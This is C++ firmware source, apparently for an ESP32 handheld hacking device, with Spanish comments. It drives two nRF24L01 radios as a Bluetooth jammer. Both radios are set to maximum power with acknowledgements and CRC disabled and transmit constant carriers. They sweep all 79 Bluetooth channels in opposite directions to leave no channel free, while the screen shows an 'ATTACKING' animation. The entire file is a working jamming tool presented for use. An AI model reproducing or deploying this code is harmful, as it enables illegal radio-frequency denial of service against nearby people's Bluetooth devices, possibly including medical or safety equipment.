#include "ble_jammer.h"

#define NRF1_CE  4
#define NRF1_CSN 5
#define NRF2_CE  6
#define NRF2_CSN 7
#define BTN_ENTER_PIN 42
#define BTN_BACK_PIN  41

RF24 jam1(NRF1_CE, NRF1_CSN);
RF24 jam2(NRF2_CE, NRF2_CSN);

// --- CAMBIO CRÍTICO: INUNDACIÓN TOTAL DE CANALES ---
// Bluetooth usa 79 canales de 1MHz. Vamos a golpearlos TODOS.
bool isBtJamming = false;
int ekgX = 10;
int lastEkgY = 120;
const int ekgBaselineY = 120;

void launchBLEJammer(LGFX &tft, bool &playing, int btnBack) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(MATRIX_GREEN);
    tft.setTextSize(2);
    tft.setCursor(10, 10);
    tft.println("BT ATTACK READY");
    
    if (!jam1.begin()) Serial.println("R1 Error");
    if (!jam2.begin()) Serial.println("R2 Error");
    
    // Configuración para máxima suciedad de señal
    auto setUltraMode = [](RF24 &r) {
        r.setAutoAck(false); 
        r.setPALevel(RF24_PA_MAX, true);
        r.setDataRate(RF24_2MBPS); // 2MBPS ensucia más ancho de banda que 1MBPS
        r.setCRCLength(RF24_CRC_DISABLED);
        r.stopListening();
    };

    setUltraMode(jam1);
    setUltraMode(jam2);

    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("MODO: INUNDACION TOTAL (0-79)");
    tft.println("ESTADO: ESPERANDO ORDEN...");

    while (playing) {
        if (digitalRead(BTN_BACK_PIN) == LOW) {
            playing = false;
            while(digitalRead(BTN_BACK_PIN) == LOW) yield();
            break;
        }

        if (digitalRead(BTN_ENTER_PIN) == LOW) {
            isBtJamming = true;
            tft.fillScreen(TFT_BLACK);
            tft.setTextColor(TFT_RED);
            tft.setTextSize(2);
            tft.setCursor(40, 20);
            tft.println(">>> ATTACKING <<<");
            
            // Iniciar portadoras en extremos
            jam1.startConstCarrier(RF24_PA_MAX, 0);
            jam2.startConstCarrier(RF24_PA_MAX, 78);
            
            delay(400); 
            ekgX = 10;

            // --- BUCLE DE ALTA PRIORIDAD: SIN HUECOS ---
            while(isBtJamming) {
                // Barremos los 79 canales de Bluetooth sin dejar ni uno solo libre
                for (int ch = 0; ch < 79; ch++) {
                    jam1.setChannel(ch);
                    jam2.setChannel(78 - ch); // El segundo radio cruza en sentido opuesto
                }

                // --- ANIMACIÓN EKG ROJA AGRESIVA ---
                int targetY = 120 + (rand() % 90) - 45;
                tft.fillRect(ekgX, 60, 15, 130, TFT_BLACK); // Borrado de rastro
                
                // Dibujar rejilla tenue
                for(int gy=80; gy<=180; gy+=25) tft.drawFastHLine(ekgX, gy, 15, 0x2000);
                
                // Línea de pulso roja
                tft.drawLine(ekgX, lastEkgY, ekgX + 3, targetY, TFT_RED);
                
                ekgX += 3;
                lastEkgY = targetY;
                if (ekgX > 305) ekgX = 10;

                // Check de salida
                if (digitalRead(BTN_ENTER_PIN) == LOW || digitalRead(BTN_BACK_PIN) == LOW) {
                    isBtJamming = false;
                    jam1.stopConstCarrier();
                    jam2.stopConstCarrier();
                    tft.fillScreen(TFT_BLACK);
                    tft.setTextColor(MATRIX_GREEN);
                    tft.println("ATAQUE FINALIZADO");
                    delay(400);
                    break;
                }
                yield();
            }
        }
        yield();
    }
    jam1.powerDown();
    jam2.powerDown();
    tft.fillScreen(TFT_BLACK);
}